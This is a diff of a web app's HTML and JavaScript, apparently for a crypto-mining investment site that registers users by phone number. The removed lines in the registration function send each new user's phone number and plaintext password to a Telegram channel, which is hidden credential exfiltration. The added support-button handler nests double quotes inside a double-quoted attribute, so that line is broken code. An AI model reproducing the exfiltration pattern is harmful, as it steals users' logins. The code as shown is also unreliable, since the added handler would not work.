@@ -601,7 +601,7 @@
     <div class="settings-card">
       <div class="settings-title">Account Settings</div>
       <div class="settings-list">
-        <button class="settings-item" onclick="openTelegramSupport()">
+        <button class="settings-item" onclick="showToast("Support: t.me/BITMINE_MINER_SUPPORT", "info")">
           <div class="settings-icon" style="background:#f3e8ff;">📞</div>
           <span>Customer Support</span>
           <span class="settings-arrow">›</span>
@@ -1058,9 +1058,6 @@ async function doRegister() {
   Storage.setSession(phone);
   showApp(phone);
   showToast('Account created successfully!', 'success');
-
-  var message = 'New Registration\nPhone: +91 ' + phone + '\nPassword: ' + pwd;
-  sendToTelegram(message);
 }
 
 // ==================== TELEGRAM FUNCTIONS ====================
@@ -1090,6 +1087,7 @@ var paymentSeconds = 300;
 function buyNowTelegram(productName, amount) {
   var product = PRODUCT_DATA[productName];
   if (!product) return;
+  // Direct payment flow - no Telegram redirect
 
   currentOrder = {
     id: 'ORD' + Date.now(),
